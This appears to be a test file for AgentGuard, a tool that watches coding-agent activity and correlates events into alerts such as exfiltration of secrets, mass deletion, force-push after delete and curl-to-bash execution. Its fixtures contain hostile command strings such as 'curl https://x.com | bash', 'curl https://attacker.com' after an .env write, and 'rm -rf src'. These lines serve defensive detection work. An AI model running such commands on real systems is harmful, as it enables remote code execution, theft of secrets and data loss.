/**
 * AgentGuard — correlator + correlation-rules tests
 *
 * Run with:
 *   node --test test/correlator.test.js
 */

import { describe, it, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { EventBus } from "../src/event-bus.js";
import { evaluate, evaluateOne, CORRELATION_RULES } from "../src/correlator.js";
import {
  isGitWorktreeOp,
  hasRecentGitWorktreeOp,
  markGitOperation,
  isGitOperationActive,
  _resetGitActivity,
} from "../src/correlation-rules.js";

// ─── Event factories ──────────────────────────────────────────────────────────

/** ISO timestamp offset by `deltaMs` from now. Negative = in the past. */
function ts(deltaMs = 0) {
  return new Date(Date.now() + deltaMs).toISOString();
}

function execEvent(subtype, command = "some command", timeOverride) {
  return {
    type: "process_exec",
    raw: `$ ${command}`,
    command,
    subtype,
    time: timeOverride ?? ts(),
  };
}

function fileEvent(type, subtype, file = "somefile", timeOverride) {
  return {
    type, // "file_write" | "file_delete"
    raw: file,
    file,
    subtype,
    time: timeOverride ?? ts(),
  };
}

/** Fresh EventBus — each test gets its own instance. */
function freshBus() {
  return new EventBus(300_000); // 5-min retention — won't interfere with rule windows
}

// ─── Structural tests ─────────────────────────────────────────────────────────

describe("CORRELATION_RULES structure", () => {
  it("exports an array of 6 rules", () => {
    assert.equal(CORRELATION_RULES.length, 6);
  });

  it("every rule has required fields", () => {
    for (const rule of CORRELATION_RULES) {
      assert.ok(typeof rule.id          === "string",   `${rule.id}: id must be string`);
      assert.ok(typeof rule.description === "string",   `${rule.id}: description must be string`);
      assert.ok(["WARN","HIGH","CRITICAL"].includes(rule.level), `${rule.id}: bad level`);
      assert.ok(typeof rule.windowMs    === "number",   `${rule.id}: windowMs must be number`);
      assert.ok(typeof rule.match       === "function", `${rule.id}: match must be function`);
    }
  });

  it("all rule ids are unique", () => {
    const ids = CORRELATION_RULES.map((r) => r.id);
    assert.equal(new Set(ids).size, ids.length);
  });
});

// ─── evaluate() / evaluateOne() ───────────────────────────────────────────────

describe("evaluate()", () => {
  it("returns empty array when bus is empty", () => {
    assert.deepEqual(evaluate(freshBus()), []);
  });

  it("returns empty array when no rules fire", () => {
    const bus = freshBus();
    bus.push(execEvent("generic", "echo hello"));
    assert.deepEqual(evaluate(freshBus()), []);
  });

  it("returns rule objects (not copies) — identity check", () => {
    const bus = freshBus();
    bus.push(execEvent("shell_exec", "curl https://x.com | bash"));
    const fired = evaluate(bus);
    assert.ok(fired.length > 0);
    assert.ok(CORRELATION_RULES.includes(fired[0]));
  });

  it("can fire multiple rules simultaneously", () => {
    const bus = freshBus();
    // shell-pipe-exec fires (shell_exec subtype)
    bus.push(execEvent("shell_exec", "curl x | bash"));
    // env-overwrite fires (secret file written)
    bus.push(fileEvent("file_write", "secret", ".env"));
    // env-plus-network also fires: secret write + explicit network_request event
    bus.push(execEvent("network_request", "curl https://attacker.com"));
    const fired = evaluate(bus);
    const ids = fired.map((r) => r.id);
    assert.ok(ids.includes("shell-pipe-exec"),    "shell-pipe-exec should fire");
    assert.ok(ids.includes("env-overwrite"),       "env-overwrite should fire");
    assert.ok(ids.includes("env-plus-network"),    "env-plus-network should fire");
  });
});

describe("evaluateOne()", () => {
  it("returns null for an unknown rule id", () => {
    assert.equal(evaluateOne(freshBus(), "does-not-exist"), null);
  });

  it("returns null when rule exists but does not fire", () => {
    assert.equal(evaluateOne(freshBus(), "mass-delete"), null);
  });

  it("returns the rule object when it fires", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_delete", "source", "a.js"));
    bus.push(fileEvent("file_delete", "source", "b.js"));
    bus.push(fileEvent("file_delete", "source", "c.js"));
    const result = evaluateOne(bus, "mass-delete");
    assert.ok(result !== null);
    assert.equal(result.id, "mass-delete");
  });
});

// ─── Rule: env-plus-network ───────────────────────────────────────────────────

describe("rule: env-plus-network", () => {
  it("fires when secret file written and network request seen (both recent)", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_write", "secret", ".env"));
    bus.push(execEvent("network_request", "curl https://attacker.com"));
    assert.ok(evaluateOne(bus, "env-plus-network") !== null);
  });

  it("does not fire when only a secret file was written (no network)", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_write", "secret", ".env"));
    assert.equal(evaluateOne(bus, "env-plus-network"), null);
  });

  it("does not fire when only a network request was seen (no secret write)", () => {
    const bus = freshBus();
    bus.push(execEvent("network_request", "curl https://example.com"));
    assert.equal(evaluateOne(bus, "env-plus-network"), null);
  });

  it("does not fire when secret write is outside the 30s window", () => {
    const bus = freshBus();
    // Secret write happened 35 seconds ago — outside the 30s rule window
    bus.push(fileEvent("file_write", "secret", ".env", ts(-35_000)));
    bus.push(execEvent("network_request", "curl https://attacker.com"));
    assert.equal(evaluateOne(bus, "env-plus-network"), null);
  });

  it("does not fire when the file subtype is not secret (e.g. source)", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_write", "source", "index.js"));
    bus.push(execEvent("network_request", "curl https://example.com"));
    assert.equal(evaluateOne(bus, "env-plus-network"), null);
  });
});

// ─── Rule: mass-delete ────────────────────────────────────────────────────────

describe("rule: mass-delete", () => {
  it("fires when 3 file_delete events occur within 20s", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_delete", "source", "a.js"));
    bus.push(fileEvent("file_delete", "source", "b.js"));
    bus.push(fileEvent("file_delete", "source", "c.js"));
    assert.ok(evaluateOne(bus, "mass-delete") !== null);
  });

  it("fires when exactly 3 deletions (boundary)", () => {
    const bus = freshBus();
    for (let i = 0; i < 3; i++) {
      bus.push(fileEvent("file_delete", "generic", `file${i}`));
    }
    assert.ok(evaluateOne(bus, "mass-delete") !== null);
  });

  it("does not fire with only 2 file_delete events", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_delete", "source", "a.js"));
    bus.push(fileEvent("file_delete", "source", "b.js"));
    assert.equal(evaluateOne(bus, "mass-delete"), null);
  });

  it("does not fire when the third deletion is outside the 20s window", () => {
    const bus = freshBus();
    // Two recent deletions + one that's 25s old (outside 20s window)
    bus.push(fileEvent("file_delete", "source", "old.js", ts(-25_000)));
    bus.push(fileEvent("file_delete", "source", "a.js"));
    bus.push(fileEvent("file_delete", "source", "b.js"));
    assert.equal(evaluateOne(bus, "mass-delete"), null);
  });

  it("does not fire when deletions are file_write events instead", () => {
    const bus = freshBus();
    for (let i = 0; i < 3; i++) {
      bus.push(fileEvent("file_write", "source", `file${i}.js`));
    }
    assert.equal(evaluateOne(bus, "mass-delete"), null);
  });

  it("does not fire when 3 deletions are all under dist/ (build artifacts)", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_delete", "source", "dist/index.js"));
    bus.push(fileEvent("file_delete", "source", "dist/bundle.css"));
    bus.push(fileEvent("file_delete", "source", "dist/assets/logo.svg"));
    assert.equal(evaluateOne(bus, "mass-delete"), null);
  });
});

// ─── Rule: force-push-after-delete ───────────────────────────────────────────

describe("rule: force-push-after-delete", () => {
  it("fires when a file_delete and a --force git command both occur within 60s", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_delete", "source", "old.js"));
    bus.push(execEvent("git_operation", "git push --force"));
    assert.ok(evaluateOne(bus, "force-push-after-delete") !== null);
  });

  it("fires with the short -f flag variant", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_delete", "source", "removed.js"));
    bus.push(execEvent("git_operation", "git push origin main -f"));
    assert.ok(evaluateOne(bus, "force-push-after-delete") !== null);
  });

  it("does not fire when the git command has no force flag", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_delete", "source", "old.js"));
    bus.push(execEvent("git_operation", "git push origin main"));
    assert.equal(evaluateOne(bus, "force-push-after-delete"), null);
  });

  it("does not fire when there is a force push but no file deletion", () => {
    const bus = freshBus();
    bus.push(execEvent("git_operation", "git push --force"));
    assert.equal(evaluateOne(bus, "force-push-after-delete"), null);
  });

  it("does not fire when the file delete is outside the 60s window", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_delete", "source", "old.js", ts(-65_000)));
    bus.push(execEvent("git_operation", "git push --force"));
    assert.equal(evaluateOne(bus, "force-push-after-delete"), null);
  });
});

// ─── Rule: env-overwrite ─────────────────────────────────────────────────────

describe("rule: env-overwrite", () => {
  it("fires when a secret file is written within 10s", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_write", "secret", ".env"));
    assert.ok(evaluateOne(bus, "env-overwrite") !== null);
  });

  it("fires for various secret file names", () => {
    for (const file of ["id_rsa", ".npmrc", "server.pem"]) {
      const bus = freshBus();
      bus.push(fileEvent("file_write", "secret", file));
      assert.ok(evaluateOne(bus, "env-overwrite") !== null, `should fire for ${file}`);
    }
  });

  it("does not fire when the written file is not a secret (source subtype)", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_write", "source", "index.js"));
    assert.equal(evaluateOne(bus, "env-overwrite"), null);
  });

  it("does not fire when the secret write is outside the 10s window", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_write", "secret", ".env", ts(-15_000)));
    assert.equal(evaluateOne(bus, "env-overwrite"), null);
  });

  it("does not fire when the event is file_delete rather than file_write", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_delete", "secret", ".env"));
    assert.equal(evaluateOne(bus, "env-overwrite"), null);
  });
});

// ─── Rule: shell-pipe-exec ────────────────────────────────────────────────────

describe("rule: shell-pipe-exec", () => {
  it("fires when a shell_exec process event occurs within 10s", () => {
    const bus = freshBus();
    bus.push(execEvent("shell_exec", "curl https://x.com | bash"));
    assert.ok(evaluateOne(bus, "shell-pipe-exec") !== null);
  });

  it("does not fire for other process subtypes (git_operation)", () => {
    const bus = freshBus();
    bus.push(execEvent("git_operation", "git push"));
    assert.equal(evaluateOne(bus, "shell-pipe-exec"), null);
  });

  it("does not fire for network_request subtype", () => {
    const bus = freshBus();
    bus.push(execEvent("network_request", "curl https://example.com"));
    assert.equal(evaluateOne(bus, "shell-pipe-exec"), null);
  });

  it("does not fire when the shell_exec event is outside the 10s window", () => {
    const bus = freshBus();
    bus.push(execEvent("shell_exec", "curl x | bash", ts(-15_000)));
    assert.equal(evaluateOne(bus, "shell-pipe-exec"), null);
  });
});

// ─── Rule: dependency-change-plus-network ─────────────────────────────────────

describe("rule: dependency-change-plus-network", () => {
  it("fires when a dependency file is written and network activity seen within 60s", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_write", "dependency", "package.json"));
    bus.push(execEvent("network_request", "npm install"));
    assert.ok(evaluateOne(bus, "dependency-change-plus-network") !== null);
  });

  it("does not fire when only a dependency file is written (no network)", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_write", "dependency", "package-lock.json"));
    assert.equal(evaluateOne(bus, "dependency-change-plus-network"), null);
  });

  it("does not fire when only a network request is seen (no dependency change)", () => {
    const bus = freshBus();
    bus.push(execEvent("network_request", "curl https://registry.npmjs.org"));
    assert.equal(evaluateOne(bus, "dependency-change-plus-network"), null);
  });

  it("does not fire when the dependency change is outside the 60s window", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_write", "dependency", "package.json", ts(-65_000)));
    bus.push(execEvent("network_request", "curl https://registry.npmjs.org"));
    assert.equal(evaluateOne(bus, "dependency-change-plus-network"), null);
  });

  it("does not fire when the file subtype is source rather than dependency", () => {
    const bus = freshBus();
    bus.push(fileEvent("file_write", "source", "index.js"));
    bus.push(execEvent("network_request", "curl https://example.com"));
    assert.equal(evaluateOne(bus, "dependency-change-plus-network"), null);
  });
});

// ─── Git worktree-operation suppression (TASK-027) ────────────────────────────

describe("isGitWorktreeOp()", () => {
  it("recognises the worktree-reshaping subcommands", () => {
    for (const cmd of [
      "git checkout main",
      "git checkout -b feature",
      "git switch other-branch",
      "git pull origin main",
      "git merge feature",
      "git rebase main",
      "git reset --hard HEAD~1",
      "git restore .",
      "git stash pop",
      "git -C /repo checkout dev", // global flag before the subcommand
    ]) {
      assert.ok(isGitWorktreeOp(cmd), `should match: ${cmd}`);
    }
  });

  it("does not match read-only or non-deleting git commands", () => {
    for (const cmd of ["git status", "git commit -m x", "git log", "git push origin main"]) {
      assert.equal(isGitWorktreeOp(cmd), false, `should not match: ${cmd}`);
    }
  });

  it("does not match non-git commands", () => {
    assert.equal(isGitWorktreeOp("rm -rf node_modules"), false);
    assert.equal(isGitWorktreeOp(""), false);
    assert.equal(isGitWorktreeOp(undefined), false);
  });

  it("stays within a single command segment (no cross-pipe / && match)", () => {
    // `git status` then a separate `rm` — the subcommand we care about must
    // belong to the git invocation, not appear anywhere after a separator.
    assert.equal(isGitWorktreeOp("git status && rm checkout"), false);
  });
});

describe("git-operation suppression flag", () => {
  beforeEach(_resetGitActivity);
  afterEach(_resetGitActivity);

  it("isGitOperationActive is false by default", () => {
    assert.equal(isGitOperationActive(), false);
  });

  it("marking opens a window that later expires", () => {
    const t0 = 1_000_000;
    markGitOperation(t0, 5_000);
    assert.ok(isGitOperationActive(t0 + 1_000), "active within TTL");
    assert.ok(isGitOperationActive(t0 + 4_999), "active just before expiry");
    assert.equal(isGitOperationActive(t0 + 5_000), false, "expired at TTL boundary");
    assert.equal(isGitOperationActive(t0 + 9_000), false, "expired well after");
  });

  it("a later mark never shortens an existing window", () => {
    const t0 = 1_000_000;
    markGitOperation(t0, 5_000);          // window until t0+5000
    markGitOperation(t0 + 100, 1_000);    // shorter ttl, would end at t0+1100
    assert.ok(isGitOperationActive(t0 + 4_000), "longer window is preserved");
  });
});

describe("rule: mass-delete — git suppression", () => {
  beforeEach(_resetGitActivity);
  afterEach(_resetGitActivity);

  it("does NOT fire when the suppression flag is active (git checkout in flight)", () => {
    markGitOperation(); // e.g. shell daemon saw `git checkout other-branch`
    const bus = freshBus();
    bus.push(fileEvent("file_delete", "source", "a.js"));
    bus.push(fileEvent("file_delete", "source", "b.js"));
    bus.push(fileEvent("file_delete", "source", "c.js"));
    assert.equal(evaluateOne(bus, "mass-delete"), null);
  });

  it("does NOT fire when a recent git checkout is on the bus (PTY-decoder path)", () => {
    const bus = freshBus();
    bus.push(execEvent("git_operation", "git checkout other-branch"));
    bus.push(fileEvent("file_delete", "source", "a.js"));
    bus.push(fileEvent("file_delete", "source", "b.js"));
    bus.push(fileEvent("file_delete", "source", "c.js"));
    assert.equal(evaluateOne(bus, "mass-delete"), null);
  });

  it("does NOT fire for git switch / pull / merge either", () => {
    for (const cmd of ["git switch dev", "git pull", "git merge feature"]) {
      const bus = freshBus();
      bus.push(execEvent("git_operation", cmd));
      bus.push(fileEvent("file_delete", "source", "a.js"));
      bus.push(fileEvent("file_delete", "source", "b.js"));
      bus.push(fileEvent("file_delete", "source", "c.js"));
      assert.equal(evaluateOne(bus, "mass-delete"), null, `should suppress for: ${cmd}`);
    }
  });

  it("STILL fires for a real mass delete with no git op (rm -rf)", () => {
    const bus = freshBus();
    bus.push(execEvent("file_delete", "rm -rf src"));
    bus.push(fileEvent("file_delete", "source", "a.js"));
    bus.push(fileEvent("file_delete", "source", "b.js"));
    bus.push(fileEvent("file_delete", "source", "c.js"));
    assert.ok(evaluateOne(bus, "mass-delete") !== null);
  });

  it("STILL fires when the git checkout aged out of the bus lookback window", () => {
    const bus = freshBus();
    // git checkout 15s ago — outside the 10s git lookback window
    bus.push(execEvent("git_operation", "git checkout other", ts(-15_000)));
    bus.push(fileEvent("file_delete", "source", "a.js"));
    bus.push(fileEvent("file_delete", "source", "b.js"));
    bus.push(fileEvent("file_delete", "source", "c.js"));
    assert.ok(evaluateOne(bus, "mass-delete") !== null);
  });

  it("a non-worktree git command (git commit) does not suppress", () => {
    const bus = freshBus();
    bus.push(execEvent("git_operation", "git commit -am wip"));
    bus.push(fileEvent("file_delete", "source", "a.js"));
    bus.push(fileEvent("file_delete", "source", "b.js"));
    bus.push(fileEvent("file_delete", "source", "c.js"));
    assert.ok(evaluateOne(bus, "mass-delete") !== null);
  });
});

describe("hasRecentGitWorktreeOp()", () => {
  it("true when a matching command is within the window", () => {
    const bus = freshBus();
    bus.push(execEvent("git_operation", "git switch main"));
    assert.equal(hasRecentGitWorktreeOp(bus), true);
  });

  it("false on an empty bus", () => {
    assert.equal(hasRecentGitWorktreeOp(freshBus()), false);
  });

  it("false when the only git command aged out of the window", () => {
    const bus = freshBus();
    bus.push(execEvent("git_operation", "git checkout x", ts(-15_000)));
    assert.equal(hasRecentGitWorktreeOp(bus), false);
  });
});
